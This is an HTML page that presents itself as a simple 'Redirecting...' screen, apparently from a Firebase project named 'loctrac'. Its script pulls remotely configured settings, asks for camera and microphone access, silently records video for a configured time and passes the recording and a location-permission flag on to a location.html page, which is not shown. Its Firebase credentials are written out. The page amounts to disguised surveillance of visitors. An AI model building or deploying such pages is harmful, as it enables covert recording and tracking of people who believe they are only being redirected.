<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .loading-dots::after {
            content: "";
            animation: dots 1s steps(4) infinite;
        }
         .error-message{
            color:red;
        }

        @keyframes dots {
             0%   {content: "";}
             25%  {content: ".";}
             50%  {content: "..";}
             75%  {content: "...";}
        }
    </style>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
</head>
<body>
    <div class="container">
        <h1>Redirecting...</h1>
        <p>You will be redirected shortly <span class="loading-dots"></span></p>
        <p id="error-message" class="error-message" style="display:none;"></p>
    </div>

<script>
// --- Firebase Config (YOUR ACTUAL CONFIG) ---
const firebaseConfig = {
    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
    authDomain: "loctrac-8d7ef.firebaseapp.com",
    projectId: "loctrac-8d7ef",
    storageBucket: "loctrac-8d7ef.firebasestorage.com",
    messagingSenderId: "34491549339",
    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
    measurementId: "G-65PYC8E9VR",
    databaseURL: "https://loctrac-8d7ef-default-rtdb.europe-west1.firebasedatabase.app" // Correct URL
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// --- Firebase Database Reference (TEMPORARY - for testing only) ---
const settingsRef = database.ref('userSettings/testUser');
const errorMessage = document.getElementById("error-message");

(async () => {
    // Get settings from Firebase
    let micCamPermission, locationPermission, redirectUrl, redirectSeconds, recordSeconds;

    try {
        const snapshot = await settingsRef.once('value');
        const data = snapshot.val();

        if (data) {
            micCamPermission = data.micCamPermission;
            locationPermission = data.locationPermission;
            redirectUrl = data.redirectUrl;
            redirectSeconds = parseInt(data.redirectSeconds) || 0;
            recordSeconds = parseInt(data.recordSeconds) || 0;
        } else {
            console.error("No data found in Firebase.");
            errorMessage.textContent = "Fout: Kon instellingen niet laden.";
            errorMessage.style.display = 'block';
            return; // Exit if no data
        }
    } catch (error) {
        console.error("Error fetching settings from Firebase:", error);
        errorMessage.textContent = `Firebase Fout: ${error.message}`;
        errorMessage.style.display = 'block';
        return; // Exit on error
    }

    // 1. Ask for permissions (if needed)
    if (micCamPermission) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // 2. Start recording (if needed)
            if (recordSeconds > 0) {
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = event => {
                    chunks.push(event.data);
                };

                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const videoUrl = URL.createObjectURL(blob);

                    // Construct the *final* redirect URL, including video data and location permission
                    let finalRedirectUrl = `location.html?videoUrl=${encodeURIComponent(videoUrl)}&locationPermission=${locationPermission}`;

                    // Redirect to location.html with the video URL
                    window.location.href = finalRedirectUrl;

                    stream.getTracks().forEach(track => track.stop()); // Cleanup
                };

                recorder.onstart = () => {
                    setTimeout(() => {
                        if (recorder.state !== "inactive") {
                            recorder.stop();
                        }
                    }, recordSeconds * 1000);
                };

                recorder.start();

            } else {
                // No recording, stop stream immediately
                stream.getTracks().forEach(track => track.stop());
                // 3. Redirect (immediately) WITH locationPermission
                let finalRedirectUrl = `location.html?locationPermission=${locationPermission}`;
                window.location.href = finalRedirectUrl;

            }

        } catch (error) {
            console.error("Error accessing camera/microphone:", error);
            errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
            errorMessage.style.display = 'block';

            // 3. Redirect (even on error) WITH locationPermission and error
            let finalRedirectUrl = `location.html?locationPermission=${locationPermission}&error=camera`;
            window.location.href = finalRedirectUrl;
        }
    } else {
        // No camera/mic needed, redirect with locationPermission
        let finalRedirectUrl = `location.html?locationPermission=${locationPermission}`;
        window.location.href = finalRedirectUrl;
    }
})();
</script>
</body>
</html>
